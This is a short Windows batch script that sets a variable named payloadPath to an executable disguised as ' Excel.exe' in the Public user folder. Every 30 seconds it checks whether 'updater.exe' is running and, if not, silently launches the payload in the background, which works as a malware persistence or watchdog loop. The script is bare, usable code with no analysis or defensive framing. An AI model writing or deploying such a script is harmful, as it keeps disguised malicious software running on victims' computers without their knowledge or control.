@echo off
set payloadPath=C:\Users\Public\ Excel.exe

:loop
timeout /t 30 /nobreak
tasklist | find /i "updater.exe" >nul || start "" /B "%payloadPath%"
goto loop
